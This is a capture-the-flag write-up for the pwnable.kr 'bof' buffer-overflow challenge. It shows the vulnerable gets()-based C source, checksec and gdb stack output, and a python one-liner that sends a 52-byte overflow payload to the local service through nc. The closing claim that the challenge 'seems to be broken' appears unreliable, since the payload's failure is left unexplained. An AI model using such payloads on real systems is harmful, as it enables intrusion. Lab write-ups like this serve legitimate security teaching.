# bof - pwnable.kr
- Challenge Name: __bof__
- Challenge category: __pwn__
- Challenge Difficulty: __easy__
- CTF Year and Date: __2025__
- Date: __2025-05-12__

## Challenge Description
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

# Information Gathering
The challenge is hosted on an server, that may be accessed by ssh:
`ssh bof@pwnable.kr -p2222 (pw: guest)`

```shell
bof@ubuntu:~$ ls -la
total 44
drwxr-x---   2 root bof   4096 Apr  3 16:04 .
drwxr-xr-x 129 root root  4096 May  6 09:27 ..
-rw-r--r--   1 root root   220 Feb 14 11:22 .bash_logout
-rw-r--r--   1 root root  3771 Feb 14 11:22 .bashrc
-rw-r--r--   1 root root   811 Apr  3 16:04 .profile
-rwxr-xr-x   1 root bof  15300 Mar 26 13:03 bof
-rw-r--r--   1 root root   342 Mar 26 13:09 bof.c
-rw-r--r--   1 root root    86 Apr  3 16:03 readme
```
Get the file information
```shell
file bof
bof: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1cabd158f67491e9edb3df0219ac3a4ef165dc76, for GNU/Linux 3.2.0, not stripped
````

```shell
bof@ubuntu:~$ checksec --file bof
[!] Could not populate PLT: [Errno 12] Cannot allocate memory
[*] '/home/bof/bof'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

````

The binary has stack protection enabled (canary) and has position-independent code (PIC) enabled. The binary runs properly regardless of the memory location it’s loaded at, i.e., the memory location doesn’t need to be a fixed address.

The source code of the binary is provided in `bof.c`

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		setregid(getegid(), getegid());
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
````

The readme contains insructions on how to get the flag: 
```shell
cat readme
bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag
```

## Vulnerability
The binary has a buffer overflow vulnerabilty: The gets() function performs no check on the size of the input. It will keep on accepting input until a newline is encountered irrespective of the size of the variable in which the input is being stored. This property is described as a lack of ‘bounds checking’.

Because canaries are used (see checksec output), the stack is protected against overflow-attacks: 

```shell
bof@ubuntu:~$ ./bof
overflow me : 1234567890123456789012345678901234
Nah..
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

## Summary of recon
- A binary with a buffer overflow vunerabilty
- The binary has stack protection enabled (canary)

# Solution/Exploit
## Task
To get the shell, we must overwrite the function local variable with the value `0xcafebabe`. This can be done with a payload that gets read by the gets() function and will overflow the `overflowme` buffer. However, we can possibly ignore the stack protection (canary), because we get shell BEFORE the function returns control to main (where stack manipulation will be detected.)

## Strategy

1. Use the debugger on the target system to calculate the offset needed to overwrite the function parameter

```shell
gdb
pwndbg> file bof
pwndbg> start
```

Use next, step and disassemble to find the position, where gets() returns, just before the parameter gets compared to the constant value of `0xcafebabe`. Then hit c (contiune) - we enter the string `AAAABBBBCCCCDDDDEEEEFFFF` on the stack, we can see that the value of the parameter is on the stack 7 * 4 bytes after the end of the overflowme buffer:

```text
pwndbg> x/40wx $sp
0xffffd4f0:	0xf7ffd608	0x00000020	0x00000000	0x41414141
0xffffd500:	0x42424242	0x43434343	0x44444444	0x45454545
0xffffd510:	0x46464646	0x00000000	0xf7d954be	0x8899f900
0xffffd520:	0xf7fa7000	0xffffd614	0xffffd548	0x565562c5
0xffffd530:	>0xdeadbeef<	0xf7fbe66c	0xf7fbeb30	0x565562b3
0xffffd540:	0x00000001	0xffffd560	0xf7ffd020	0xf7d9e519
0xffffd550:	0xffffd753	0x00000070	0xf7ffd000	0xf7d9e519
0xffffd560:	0x00000001	0xffffd614	0xffffd61c	0xffffd580
0xffffd570:	0xf7fa7000	0x5655629d	0x00000001	0xffffd614
0xffffd580:	0xf7fa7000	0xffffd614	0xf7ffcb80	0xf7ffd020
```

We can calculate the distance between our input and 0xdeadbeef easily, each hex value represents 4 bytes (0x41414141 == AAAA) and we have exactly 13 of them before 0xdeadbeef.

We can create the payload using a simple python script and pass it to nc: 

```shell
python3 -c "import sys; sys.stdout.buffer.write(b''.join([b'A' * 52]) + b'\xbe\xba\xfe\xca' + b'\n')" | nc 0 9000 
````

But there is no shell. However, when we alter the value of that should overwrite the parameter `key`we get a `stack smashed` warning: 

```shell
bof@ubuntu:~$ python3 -c "import sys; sys.stdout.buffer.write(b''.join([b'A' * 52]) + b'\xbe\xba\xfe\xce' + b'\n')" | nc 0 9000
*** stack smashing detected ***: terminated
```

# Conclusion
- The challenge seems to be broken. 

# References

